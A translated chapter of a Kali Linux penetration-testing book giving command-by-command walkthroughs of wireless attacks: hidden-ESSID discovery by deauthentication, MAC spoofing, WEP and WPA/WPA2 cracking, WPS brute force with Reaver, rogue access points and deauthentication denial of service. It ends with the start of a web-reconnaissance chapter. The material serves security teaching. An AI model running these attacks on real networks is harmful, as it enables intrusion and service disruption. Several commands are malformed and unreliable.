+   `ENC`显示正在使用的加密——如果没有使用加密，则为`OPN`或开放，如果使用了加密，则为`WEP`或`WPA`/`WPA2`。`CIPHER`和`AUTH`提供额外的加密信息。

+   扩展服务集标识符（ESSID）是由共享相同 SSID 或名称的接入点组成的无线网络的通用名称。

在终端窗口的下部，您将看到试图连接或已连接到无线网络的站点。

在我们可以与任何这些（潜在的）目标网络进行交互之前，我们必须确认我们的无线适配器是否能够进行数据包注入。为此，请从终端 shell 提示符运行以下命令：

```
root@kali:~# aireplay-ng -9 mon0

```

上一个命令的执行显示在以下截图中。这里的`-9`表示注入测试。

![无线侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_05.jpg)

## Kismet

无线侦察最重要的工具之一是 Kismet，这是一个 802.11 无线侦测器、嗅探器和入侵检测系统。

Kismet 可用于收集以下信息：

+   无线网络的名称，ESSID

+   无线网络的信道

+   接入点的 MAC 地址，BSSID

+   无线客户端的 MAC 地址

它还可以用于嗅探 802.11a、802.11b、802.11g 和 802.11n 无线流量的数据。Kismet 还支持插件，允许它嗅探其他无线协议。

要启动 Kismet，请在终端窗口的命令提示符中输入`kismet`。

启动 Kismet 时，您将面临一系列问题，这些问题将允许您在启动过程中对其进行配置。回答“是”以“您能看到颜色”，接受“Kismet 正在以 root 身份运行”，并选择“是”以“启动 Kismet 服务器”。在 Kismet 启动选项中，取消选中“显示控制台”，因为它会遮挡屏幕。允许 Kismet 启动。

您将被提示添加一个捕获接口；通常会选择`wlan0`。

Kismet 然后将开始嗅探数据包，并收集有关所有位于附近物理邻域的无线系统的信息。

![Kismet](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_06.jpg)

通过双击选择一个网络，将带您进入一个网络视图，提供有关无线网络的其他信息。

您还可以深入了解连接到各种无线网络的特定客户端。

使用 Kismet 作为初始侦察工具来启动一些特定的攻击（如嗅探传输数据）或识别网络。因为它 passively 收集连接数据，所以它是一个用于识别隐藏网络的优秀工具，特别是当 SSID 没有公开传输时。

# 绕过隐藏的服务集标识符

ESSID 是唯一标识无线局域网的字符序列。隐藏 ESSID 是一种试图通过“安全性通过混淆”来实现安全性的不良方法；不幸的是，ESSID 可以通过以下方式获得：

+   嗅探无线环境并等待客户端关联到网络，然后捕获该关联

+   主动去认证客户端以强制客户端关联，然后捕获该关联

`aircrack`工具特别适合捕获解除隐藏 ESSID 所需的数据，如以下步骤所示：

1.  在命令提示符下，通过输入以下命令确认攻击系统上已启用无线功能：

```
root@kali:~# airmon-ng

```

1.  接下来，使用以下`ifconfig`命令来查看可用的接口，并确定您的无线系统使用的确切名称：

```
root@kali:~# ifconfig

```

1.  通过输入以下内容启用您的无线接口（您可能需要用前一步骤中识别的可用无线接口替换`wlan0`）：

```
root@kali:~# airmon-ng start wlan0

```

1.  如果您使用`ifconfig`重新确认，您将看到现在正在使用监视或`mon0`地址。现在，使用`airodump`确认可用的无线网络，如以下命令所示：

```
root@kali:~# airodump-ng mon0

```

![绕过隐藏的服务集标识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_07.jpg)

正如您所看到的，第一个网络的 ESSID 只被标识为`<length: 9>`。没有使用其他名称或标识。隐藏的 ESSID 的长度被确定为由九个字符组成；然而，这个值可能不正确，因为 ESSID 是隐藏的。真正的 ESSID 长度可能比九个字符短或长。

重要的是可能有客户端连接到这个特定的网络。如果有客户端存在，我们将去认证客户端，迫使他们在重新连接到接入点时发送 ESSID。

重新运行`airodump`，并过滤出除目标接入点以外的所有内容。在这种特殊情况下，我们将专注于使用以下命令从第六信道的隐藏网络收集数据：

```
root@kali:~# airodump-ng -c 6 mon0

```

执行该命令会删除来自多个无线源的输出，并允许攻击者专注于目标 ESSID，如以下屏幕截图所示：

![绕过隐藏的服务集标识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_08.jpg)

执行`airodump`命令时得到的数据表明，有一个站点（`00:0E:2E:CF:8C:7C`）连接到 BSSID（`00:18:39:D5:5D:61`），后者又与隐藏的 ESSID 相关联。

要捕获 ESSID 在传输时，我们必须创建一个条件，在这种条件下我们知道它将被发送——在客户端和接入点之间的连接的初始阶段。

因此，我们将向客户端和接入点发动去认证攻击，发送一系列数据包，打破它们之间的连接，迫使它们重新认证。

要发动攻击，打开一个新的命令窗口，并输入以下屏幕截图中显示的命令（`0`表示我们正在发动去认证攻击，`10`表示我们将发送 10 个去认证数据包，`-a`是目标接入点，`c`是客户端的 MAC 地址）：

![绕过隐藏的服务集标识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_09.jpg)

在发送所有去认证数据包后，返回到监视第六信道上的网络连接的原始窗口，如以下屏幕截图所示。您现在将清楚地看到 ESSID。

![绕过隐藏的服务集标识](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_10.jpg)

知道 ESSID 有助于攻击者确认他们正在专注于正确的网络（因为大多数 ESSID 都基于公司身份）并促进登录过程。

# 绕过 MAC 地址认证

**媒体访问控制**（**MAC**）地址在网络中唯一标识每个节点。它采用六对十六进制数字（0 到 9 和字母 A 到 F）的形式，由冒号或破折号分隔，通常看起来像这样：`00:50:56:C0:00:01`。

MAC 地址通常与网络适配器或具有网络功能的设备相关联；因此，它经常被称为物理地址。

MAC 地址中的前三对数字称为**组织唯一标识符**，它们用于识别制造或销售设备的公司。最后三对数字是特定于设备的，并且可以被视为*序列号*。

因为 MAC 地址是唯一的，它可以用来将用户与特定网络关联起来，特别是无线网络。这有两个重要的含义——它可以用来识别黑客或试图访问网络的合法网络测试人员，并且可以用作认证个人并授予他们对网络的访问权限的手段。

在渗透测试期间，测试人员可能希望对网络保持匿名。支持匿名配置的一种方法是更改攻击系统的 MAC 地址。

这可以通过使用`ifconfig`命令手动完成。要确定现有的 MAC 地址，请从命令行运行以下命令：

```
root@kali:~# ifconfig wlan0 down
root@kali:~# ifconfig wlan0 | grep HW

```

手动更改 IP 地址，请使用以下命令：

```
root@kali:~# ifconfig wlan0 hw ether 38:33:15:xx:xx:xx
root@kali:~# ifconfig wlan0 up

```

用不同的十六进制对替换“xx”表达式。这个命令将允许我们将攻击系统的 MAC 地址更改为受害者网络接受的 MAC 地址之一。攻击者必须确保 MAC 地址在网络上尚未被使用，否则重复的 MAC 地址可能会在网络被监视时触发警报。

### 注意

在更改 MAC 地址之前，无线接口必须被关闭。

Kali 还允许使用自动化工具`macchanger`。要将攻击者的 MAC 地址更改为由同一供应商生产的产品的 MAC 地址，请在终端窗口中使用以下`macchanger`命令：

```
root@kali:~# macchanger wlan0 -e

```

要将现有的 MAC 地址更改为完全随机的 MAC 地址，请使用以下命令：

```
root@kali:~# macchanger wlan0 -r

```

![绕过 MAC 地址认证](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_11_new.jpg)

一些攻击者使用自动化脚本在测试期间频繁更改 MAC 地址，以匿名化他们的活动。

许多组织，特别是大型学术团体，如学院和大学，使用 MAC 地址过滤来控制谁可以访问他们的无线网络资源。MAC 地址过滤使用网络卡上的唯一 MAC 地址来控制对网络资源的访问；在典型的配置中，组织维护一个 MAC 地址的**白名单**，允许访问网络的 MAC 地址。如果传入的 MAC 地址不在批准的访问列表上，它将被限制连接到网络。

不幸的是，MAC 地址信息是明文传输的。攻击者可以使用`airodump`收集一系列被接受的 MAC 地址，然后手动将他们的 MAC 地址更改为目标网络接受的地址之一。因此，这种类型的过滤几乎不提供对无线网络的真正保护。

使用加密提供了下一级别的无线网络保护。

# 破解 WEP 加密

**无线等效隐私**（**WEP**）始于 1999 年，旨在为 802.11 无线网络提供与有线网络相媲美的保密度。在其加密实现中很快发现了多个缺陷，到 2004 年被**WiFi 保护访问**（**WPA**）协议取代。

### 注意

WEP 至今仍在使用，特别是在无法支持新无线路由器资源需求的旧网络中。在最近对一个主要大都市中心的无线调查中，几乎 25%的加密无线网络继续使用 WEP。其中许多网络与金融公司相关。

WEP 的主要缺陷之一是在**初始化向量**（**IV**）的重用中首次被发现。WEP 依赖于 RC4 加密算法，这是一种流密码——相同的加密密钥不能重复使用。IV 被引入以防止密钥重用，通过在加密数据中引入一定程度的*随机性*。不幸的是，24 位 IV 太短，无法防止重复；此外，同一个 IV 在传输了仅 5000 个数据包后就有 50%的概率重复。

攻击者可以窃听或拦截 WEP 加密的流量。根据可用于检查的拦截数据包数量，密钥恢复可能会很快发生。实际上，大多数 WEP 密钥可以在三分钟内恢复或*破解*。

要使 WEP 破解起作用，您还需要了解有关目标的以下信息：

+   无线网络的名称或 ESSID

+   接入点的 MAC 地址，BSSID

+   使用的无线频道

+   无线客户端的 MAC 地址

对 WEP 的最常见攻击可以通过执行以下步骤来完成：

1.  首先，使用以下命令识别可用的无线网络接口：

```
root@kali:~# airmon-ng

```

1.  停止接口以更改 MAC 地址为已与目标网络关联的现有客户端正在使用的地址。您还可以在此步骤中使用`macchanger`。当 MAC 地址已更改时，重新启动`airmon-ng`。使用以下命令执行这些步骤：

```
root@kali:~# airmon-ng stop
root@kali:~# ifconfig wlan0 down
root@kali:~# ifconfig wlan0 hw ether (mac address)
root@kali:~# airmon-ng start wlan0

```

使用已知和接受的 MAC 地址简化了攻击。然而，情况并非总是如此。这种攻击假设您*不*知道 MAC 地址。相反，我们将与网络进行虚假关联。

1.  使用以下`airodump`命令来定位目标无线网络：

```
root@kali:~# airodump-ng wlan0

```

当`airodump`定位到目标时，按下*Ctrl* + *C*停止搜索。复制 BSSID 中的 MAC 地址，并记下频道。当`airodump`定位到目标时，按下*Ctrl* + *C*停止搜索。复制 BSSID 中的 MAC 地址，并记下频道；在下面截图中显示的示例中，目标网络`dd_wep`在速度为 11 MB 的第六频道上运行。

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_12.jpg)

1.  启动`airodump-ng`以嗅探无线流量并使用以下命令收集 IV 数据包，其中`--bssid`允许我们选择目标的 BSSID，`-c`表示频道，`-w`允许我们写入输出文件的名称（`wep_out`）：

```
root@kali:~# airodump-ng --bssid 00:06:25:9A:A9:C6 -c 6 -w
  wep_out wlan0 

```

1.  现在我们必须增加传输的 IV 数据包数量。打开第二个终端窗口（不要关闭第一个）并输入以下命令，对目标无线接入点进行虚假认证：

```
root@kali:~# aireplay-ng -1 0 -a 00:06:25:9A:A9:C6 -h 
  00:11:22:33:44:55 -e dd_wep wlan0 

```

这里，`-1`表示虚假认证，`0`是重新关联的时间（设置为`0`可能会引起防御者的警觉，因此攻击者可能将其设置为 30 甚至更高）。

1.  在进行虚假认证后，我们将生成似乎来自受信任 MAC 地址的流量，并将其路由到目标无线接入点。

```
root@kali:~# aireplay-ng -3  -b 00:06:25:9A:A9:C6 -h 
  00:11:22:33:44:55 wlan0 

```

这种攻击被称为 ARP 注入或 ARP 重放攻击。通常，目标接入点将重新广播 ARP 数据包并每次生成一个新的 IV；因此，这是一种快速培育必要 IV 的方法。

先前命令的执行结果如下截图所示：

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_13.jpg)

1.  让我们在 ARP 注入继续的同时生成一些额外的数据包。打开另一个终端窗口，并输入以下命令开始交互式数据包重放攻击：

```
root@kali:~# aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF 
  - b (mac address) -h (mac address) wlan0 

```

在这里，`-2`表示我们正在使用交互式重放攻击，`-p 0841`设置数据包的帧控制字段，使其看起来像是从无线客户端发送的，`-c FF:FF:FF:FF:FF:FF`设置目的地（在这种情况下，`FF`符号发送数据包到网络上的所有主机），`-b`是 BSSID 的 MAC 地址，`-h`是正在传输的数据包的 MAC 地址，应与测试者的 MAC 地址匹配。

先前命令的执行结果如下截图所示：

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_14_new.jpg)

1.  使网络看起来繁忙的另一种技术是在攻击系统上打开多个命令 shell，并输入以下命令，将（`IP 地址`）替换为目标的 IP 地址：

```
root@kali:~# ping -T -L 6500 (IP address)

```

1.  收集并保存足够的数据包后，可以使用以下`aircrack-ng`命令来破解 WEP 密钥，其中`-a 1`强制攻击模式为静态 WEP，`-b`是 BSSID，`dd_wep.cap`是包含捕获的 IV 的捕获文件。

```
root@kali:~# aircrack-ng -a 1 -b 00:06:25:9A:A9:C6 -n 64 
  dd_wep.cap 

```

如下面的截图所示，攻击成功，并且密钥已被识别。（尽管它看起来是一个十六进制数，您只需输入它即可登录到 WEP 网络。）

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_15.jpg)

尽管这个演示集中在 64 位密钥上，但一旦从访问点收集了 IVs，更长的密钥破解时间并不会显著增加。

`aircrack-ng`套件是“黄金标准”，提供了获得访问的最可靠和有效的方式。然而，Kali 还配备了其他几种工具，可以帮助您破解加密的无线网络。

其中一个是 Fern WiFi Cracker，它是一个集成了`aircrack-ng`的 Python GUI。它可以自动扫描无线网络并识别 WEP、WPA 和 WPA2 网络。一旦识别出网络，攻击者可以利用以下几个功能：

+   使用各种攻击来破解 WEP，包括分段、Chop Chop、Caffe Latte、Hirte、ARP 请求重放或 WPS 攻击

+   使用字典或基于 WPS 的攻击来破解 WPA 和 WPA2

+   成功破解后自动将密钥保存到数据库

+   内部中间人引擎支持会话劫持

+   对 HTTP、HTTPS、Telnet 和 FTP 进行暴力攻击

Fern 的界面非常干净，设置引导用户选择接口并扫描访问点。它将报告 WEP 和 WPA/WPA2 的访问点；从这一点开始，只需点击适当的按钮启动攻击。Fern 的初始启动界面如下截图所示：

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_16.jpg)

尽管 Fern 是一个很好的工具，但大多数测试人员并不完全依赖它——如果无法识别密钥或无法访问网络，失败的原因可能隐藏在 GUI 背后，使故障排除变得困难。

类似的应用程序是 Wifite 无线审计员，它提供了一个基于文本的界面来支持测试。在现场测试中已被证明非常有效，并利用了以下功能：

+   Wifite 通过在攻击之前将攻击者的 MAC 地址更改为随机 MAC 地址来支持匿名，并在所有攻击完成后将其改回来

+   按信号强度（以 dB 为单位）对目标进行排序，以首先破解最近的访问点

+   自动使隐藏网络的客户端脱机以显示 SSID

+   支持多种攻击类型

在下面的截图中显示的示例中，选择了一个名为`dd_wep`的单个目标进行攻击。不需要与应用程序进行任何其他交互；它完成了完全的破解并将破解的密钥保存到数据库中。

![破解 WEP 加密](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_17.jpg)

尽管已经有一些基本工具可以在 Kali 上使用来证明已经废弃的 WEP 的漏洞，但更强大的 WPA 加密协议能经受住多大的攻击呢？

# 攻击 WPA 和 WPA2

**WiFi Protected Access**（**WPA**）和**WiFi Protected Access 2**（**WPA2**）是旨在解决 WEP 安全缺陷的无线安全协议。因为 WPA 协议为每个数据包动态生成新密钥，它们防止了导致 WEP 失败的统计分析。然而，它们对一些攻击技术是脆弱的。

WPA 和 WPA2 经常使用**预共享密钥**（**PSK**）来保护接入点和无线客户端之间的通信。PSK 应该是至少 13 个字符长的随机密码；如果不是，就有可能通过将 PSK 与已知字典进行比较来确定 PSK，使用暴力破解攻击。这是最常见的攻击方式。（请注意，如果配置为企业模式，提供使用 RADIUS 认证服务器进行认证，从我们的角度来看，WPA 是“无法破解”的！）

## 暴力破解攻击

与 WEP 不同，WPA 解密需要攻击者创建特定的数据包类型，以揭示细节，例如接入点和客户端之间的握手。

要攻击 WPA 传输，应执行以下步骤：

1.  启动无线适配器，并使用`ifconfig`命令确保创建了监视接口。

1.  使用`airodump-ng –wlan0`来识别目标网络。

1.  使用以下命令开始捕获目标接入点和客户端之间的流量：

```
root@kali:~# airodump-ng --bssid 28:10:7B:61:20:32 -c 11 
  --showack -w dd_wpa2 wlan0 

```

将`-c`设置为监视特定频道，`--showack`标志以确保客户端计算机确认您的请求将其从无线接入点去认证，并将`-w`用于将输出写入文件以供以后进行字典攻击。这种攻击的典型输出如下截图所示：

![Brute-force attacks](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_18.jpg)

1.  保持这个终端窗口打开，并打开第二个终端窗口来发起去认证攻击；这将迫使用户重新对目标接入点进行认证并重新交换 WPA 密钥。去认证攻击命令如下所示：

```
root@kali:~# aireplay-ng -0 10 –a 28:10:7B:61:20:32 
  -c 00:1D:60:7D:55:5A wlan0 

```

上一个命令的执行结果如下截图所示：

![Brute-force attacks](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_19.jpg)

成功的去认证攻击将显示`ACKs`，表明连接到目标接入点的客户端已确认刚刚发送的去认证命令。

1.  查看原始命令行，保持打开以监视无线传输，并确保捕获 4 次握手。成功的 WPA 握手将在控制台的右上角标识。在下面的示例中，数据表明 WPA 握手值为`28:10:7B:61:20:32`：![Brute-force attacks](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_20.jpg)

1.  使用`aircrack`来破解 WPA 密钥，使用定义的单词列表。攻击者为收集握手数据定义的文件名将位于根目录中，并且将附加`-01.cap`扩展名。

在 Kali 中，单词列表位于`/usr/share/wordlists`目录中。虽然有几个单词列表可用，但建议您下载更有效地破解常见密码的列表。

在上面的示例中，密钥已经预先放置在密码列表中。对于长、复杂的密码进行字典攻击可能需要几个小时，具体取决于系统配置。以下命令使用`words`作为源单词列表。

```
root@kali:~# aircrack-ng wpa-01.cap /usr/share/wordlists

```

以下截图显示了成功破解 WPA 密钥的结果；经过 44 个密钥的测试，发现网络管理员的密钥是`princessmouse`。

![Brute-force attacks](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_21.jpg)

如果你手头没有自定义密码列表或希望快速生成一个列表，你可以在 Kali 中使用 crunch 应用程序。以下命令指示 crunch 使用给定的字符集创建一个最小长度为 5 个字符、最大长度为 25 个字符的单词列表：

```
root@kali:~# crunch 0 25
  abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX
  YZ0123456789 | aircrack-ng --bssid (MAC address) 
  -w capture-01.cap 

```

您还可以使用基于 GPU 的密码破解工具（oclHashcat 用于 AMD/ATI 显卡，cudaHashcat 用于 NVIDIA 显卡）来提高暴力破解攻击的效果。

要执行此攻击，首先使用以下命令将 WPA 握手捕获文件`psk-01.cap`转换为 hashcat 文件：

```
root@kali:~# aircrack-ng psk-01.cap -J <output file>

```

转换完成后，使用以下命令对新的捕获文件运行 hashcat（选择与您的 CPU 架构和图形卡匹配的 hashcat 版本）：

```
root@kali:~# cudaHashcat-plus32.bin -m 2500 <filename>.hccap<wordlist>

```

## 使用 Reaver 攻击无线路由器

WPA 和 WPA2 也容易受到对接入点的 Wi-Fi 受保护设置（WPS）和 PIN 码的攻击。

大多数接入点支持**Wi-Fi 受保护设置**（**WPS**）协议，该协议于 2006 年成为标准，允许用户轻松设置和配置接入点，并将新设备添加到现有网络，而无需重新输入大而复杂的密码。

不幸的是，PIN 码是一个 8 位数字（100,000,000 种可能的猜测），但最后一个数字是一个校验和值。因为 WPS 认证协议将 PIN 码分成两半并分别验证每一半，这意味着第一半 PIN 码有 10⁴（10,000）个值，第二半有 10³（1,000）个可能的值——攻击者只需最多猜测 11,000 次就能破坏接入点！

Reaver 是一个旨在最大化猜测过程的工具（尽管 Wifite 也进行 WPS 猜测）。

要启动 Reaver 攻击，使用一个名为`wash`的伴侣工具来识别任何易受攻击的网络，如以下命令所示：

```
root@kali:~# wash -i wlan0 --ignore-fcs

```

如果有任何易受攻击的网络，使用以下命令对它们发动攻击：

```
root@kali:~# reaver -i wlan0 -b (BBSID) -vv

```

在 Kali 中测试这种攻击表明，攻击速度慢，容易失败；然而，它可以用作后台攻击或补充其他攻击路径来破坏 WPA 网络。

# 克隆接入点

对无线网络的一种更有趣的攻击依赖于克隆接入点，然后监视用户尝试连接时传输的信息。攻击者不仅可以获得认证凭据，还可以利用中间人攻击来拦截或重定向网络流量。

Kali 中包含的几个工具声称支持克隆或制造伪造接入点；然而，目前这些工具存在缺陷。例如，社会工程工具包和 Websploit 不与 Kali 预装的 DHCP 服务器集成。

大多数攻击者寻找外部工具，包括 Gerix 或 easy-creds 等脚本；然而，`aircrack-ng`套件也包括一个工具。`airbase-ng`，用于克隆接入点。

为了制作一个假的无线接入点，攻击者将：

1.  启动`wlan0`进入监视模式，这将创建一个用于监视的`mon0`接口，使用以下命令：

```
root@kali:~# airmon-ng start wlan0

```

1.  使用以下命令在`mon0`上设置接入点（AP）。社会工程学对 AP 的成功有重大影响，因此使用一个能吸引目标客户的名称。在这个例子中，我们将使用一个通用的开放式 Wi-Fi 网络名称。它将在 WiFi 频道六上建立：

```
root@kali:~# airbase-ng --essid Customer_Network 
  -c 6 mon0 

```

1.  使用以下命令安装桥接工具：

```
apt-get install bridge-utils

```

1.  在另一个终端窗口中，使用桥接工具创建一个桥接（`rogue`），并将`at0`（`at0`接口是由前一个命令创建的）链接到`eth0`（请注意，必须首先使用`apt-get install bridge-utils`安装桥接工具）。

```
root@kali:~# brctl addbr rogue
root@kali:~# brctl addif rogue at0
root@kali:~# brctl addif rogue eth0

```

因为这两个接口被集成到虚拟桥中，你可以使用以下命令释放它们的 IP 地址：

```
root@kali:~# ifconfig at0 down
root@kali:~# ifconfig at 0.0.0.0 up
root@kali:~# ifconfig eth0 down
root@kali:~# ifconfig eth0 0.0.0.0 up

```

1.  使用以下命令启用桥接上的 IP 转发：

```
root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward

```

1.  使用以下命令配置桥接到连接到`eth0`的 LAN 的 IP 地址：

```
root@kali:~# ifconfig rogue 10.1.x.y netmask 255.255.255.0 broadcast 10.1.x.255 up
root@kali:~# route add default gw 10.1.x.1

```

1.  使用以下命令启动 AP 以嗅探认证握手：

```
airbase-ng -c 6 -e --ESSID /file_path/file.cap wlan0

```

# 拒绝服务攻击

我们将评估对无线网络的最终攻击是拒绝服务攻击，攻击者剥夺合法用户访问无线网络或通过使网络崩溃使其不可用。无线网络极易受到 DoS 攻击的影响，并且很难在分布式无线网络上定位攻击者。DoS 攻击的例子包括以下内容：

+   向无线网络注入制作的网络命令，如重新配置命令，可以导致路由器、交换机和其他网络设备的故障。

+   一些设备和应用程序可以识别正在发生的攻击，并将自动响应以禁用网络。一个恶意的攻击者可以发动一个明显的攻击，然后让目标自己创建 DoS！

+   用数据包的洪水攻击无线网络可以使其无法使用；例如，一个 HTTP 洪水攻击向 Web 服务器发出数千个页面请求，可以耗尽其处理能力。同样，用认证和关联数据包淹没网络会阻止用户连接到接入点。

+   攻击者可以制作特定的去认证和去关联命令，这些命令用于关闭无线网络上的授权连接，并淹没网络，阻止合法用户维持与无线接入点的连接。

为了证明这一点，我们将通过向网络发送去认证数据包来制造一个拒绝服务攻击。因为无线 802.11 协议是建立在接收到特定数据包时支持去认证的基础上的（这样用户可以在不再需要连接时断开连接），这可能是一个毁灭性的攻击——它符合标准，没有办法阻止它发生。

“撞”一个合法用户离开网络的最简单方法是用一连串的去认证数据包来攻击他们。可以使用`aircrack-ng`工具套件的以下命令来实现这一点：

```
root@kali:~# aireplay-ng -0 0 -a (bssid) -c wlan0

```

这个命令将攻击类型标识为`-0`，表示这是一个去认证攻击。第二个`0`（零）会发出一连串的去认证数据包，使网络对其用户不可用。

Websploit 框架是一个用于扫描和分析远程系统的开源工具。它包含了几个工具，包括专门用于无线攻击的工具。要启动它，打开命令行，然后简单地输入`websploit`。

Websploit 界面类似于`recon-ng`和 Metasploit Framework，并为用户提供了模块化界面。

启动后，使用`show modules`命令查看现有版本中存在的攻击模块。使用`use wifi/wifi_jammer`命令选择 WiFi 干扰器（一连串的去认证数据包）。如下截图所示，攻击者只需使用`set`命令设置各种选项，然后选择`run`来发动攻击。

![拒绝服务攻击](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_08_22.jpg)

# 总结

在本章中，我们研究了对无线网络成功攻击所需的几个管理任务，包括选择无线适配器、配置无线调制解调器，并使用诸如 aircrack-ng Kismet 等工具进行侦察。我们专注于使用`aircrack-ng`工具套件来识别隐藏网络、绕过 MAC 认证以及破解 WEP 和 WPA/WPA2 加密。我们还看到了如何克隆或复制无线接入点，以及如何对无线网络进行拒绝服务攻击。

下一章将重点介绍攻击者如何针对网站及其服务。我们将研究用于侦察的工具，特别是客户端代理和漏洞扫描器。我们将看到攻击者如何利用这些漏洞与自动化工具，如利用框架和在线密码破解。更重要的是，我们将研究一些通常需要手动干预的离散攻击，例如注入攻击和跨站脚本。最后，我们将探讨在线服务的特殊性，以及它们为何以及如何容易受到 DoS 攻击的影响。



# 第九章：对基于 Web 的应用程序的侦察和利用

在前几章中，我们审查了攻击者的杀伤链——用于破坏网络和设备、披露数据或阻碍对网络资源的访问的具体方法。在第七章中，*物理攻击和社会工程*，我们研究了攻击的途径，从物理攻击和社会工程开始。在第八章中，*利用无线通信*，我们看到了无线网络如何被 compromise。在本章中，我们将重点关注通过网站和基于 Web 的应用程序的最常见的攻击途径之一。

提供内容和基于 Web 的服务（例如电子邮件和 FTP）的网站是无处不在的，大多数组织几乎始终允许远程访问这些服务。然而，对于渗透测试人员和攻击者来说，网站暴露了发生在网络上的后端服务，访问网站的用户的客户端活动以及用户与网站数据之间的连接频繁攻击。本章将重点关注攻击者对网站和 Web 服务的视角，我们将在第十章中审查对连接的攻击，*利用远程访问通信*和第十一章中的客户端攻击，*客户端利用*。

到本章结束时，您将学到以下内容：

+   将侦察原则扩展到 Web 服务

+   漏洞扫描

+   使用客户端代理

+   利用 Web 服务中的漏洞

+   使用 Web 后门维持对受损系统的访问

### 提示

在许多练习中，我们将使用 NOWASP 或 Mutillidae 作为目标网站，该网站包含可以利用的已知漏洞；它可以从[www.owasp.org/index.php/Category:OWASP_Mutillidae](http://www.owasp.org/index.php/Category:OWASP_Mutillidae)下载。这个 Web 应用程序可以直接安装到 Linux 或 Windows 上，使用 LAMP、WAMP 和 XAMPP。它也预先安装在 SamauraiWTF 和 Metasploitable 测试环境中。请参考附录，*安装 Kali Linux*，了解创建 Metasploitable 测试环境的说明。

# 对网站进行侦察

网站及其服务的交付特别复杂。通常，服务是使用多层架构交付给最终用户的，其中 Web 服务器可以被公共互联网访问，同时与位于网络上的后端服务器和数据库进行通信。

测试期间必须考虑的几个额外因素增加了复杂性，其中包括以下内容：

+   网络架构，包括安全控制（防火墙、IDS/IPS 和蜜罐）和负载平衡等配置

+   平台架构（硬件、操作系统和附加应用程序）托管 Web 服务的系统

+   应用程序、中间件和最终层数据库可能采用不同的平台（Unix 或 Windows）、供应商、编程语言和商业和专有软件的混合

+   认证和授权流程，包括在应用程序中维护会话状态的流程

+   规定应用程序将如何使用的基础业务逻辑

+   客户端与网络服务的交互和通信

鉴于网络服务的复杂性已经得到证明，渗透测试人员需要适应每个站点特定的架构和服务参数。同时，测试过程必须一贯应用，并确保没有遗漏。已经提出了几种方法来实现这些目标。最广泛接受的方法是开放式 Web 应用安全项目（OWASP）（[www.owasp.org](http://www.owasp.org)）及其十大漏洞清单。

作为最低标准，OWASP 为测试人员提供了强有力的指导。然而，仅关注十大漏洞是短视的，该方法在发现应用程序应如何支持业务实践的逻辑漏洞时已经表现出一些缺陷。

使用杀链方法，一些特定于网络服务侦察的活动应该被突出，包括以下内容：

+   确定目标站点，特别是关于它的托管位置和方式。

+   列举目标网站的站点目录结构和文件，包括确定是否使用内容管理系统（CMS）。这可能包括下载网站进行离线分析，包括文档元数据分析，并使用网站创建用于密码破解的自定义字典（使用 crunch 等程序）。还要确保所有支持文件也被识别。

+   识别认证和授权机制，并确定在与该网络服务进行交易时如何维护会话状态。这通常涉及对 cookie 的分析以及它们的使用方式。

+   列举所有表单。由于这些是客户端输入数据和与网络服务交互的主要手段，这些是一些可利用的漏洞的特定位置，比如 SQL 注入攻击和跨站脚本。

+   识别其他接受输入的区域，比如允许文件上传的页面以及对接受的上传类型的任何限制。

+   确定如何处理错误，以及用户收到的实际错误消息；通常，错误会提供有价值的内部信息，比如使用的软件版本，或者内部文件名和进程。

+   确定哪些页面需要并维护安全套接字层或其他安全协议（参见第十章，“利用远程访问通信”）。

第一步是进行先前描述的被动和主动侦察（参见第二章，“确定目标-被动侦察”和第三章，“主动侦察和漏洞扫描”）；特别是确保识别托管站点，然后使用 DNS 映射来识别由同一服务器提供的所有托管站点（攻击的最常见和成功的手段之一是攻击与目标网站托管在同一物理服务器上的非目标站点，利用服务器的弱点获取根访问权限，然后使用升级后的权限攻击目标站点）。

下一步是识别网络防护设备的存在，比如防火墙、IDS/IPS 和蜜罐。一个越来越常见的防护设备是 Web 应用防火墙（WAF）。

如果使用了 WAF，测试人员将需要确保攻击，特别是依赖精心制作的输入的攻击，被编码以绕过 WAF。

WAF 可以通过手动检查 cookie（一些 WAF 会标记或修改在 Web 服务器和客户端之间通信的 cookie），或者通过头信息的更改（当测试人员使用 Telnet 等命令行工具连接到端口 80 时识别）来识别。

WAF 检测的过程可以使用`nmap`脚本`http-waf-detect.nse`自动化，如下截图所示：

![对网站进行侦察](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/ms-kali-adv-pentest/img/3121OS_09_01.jpg)

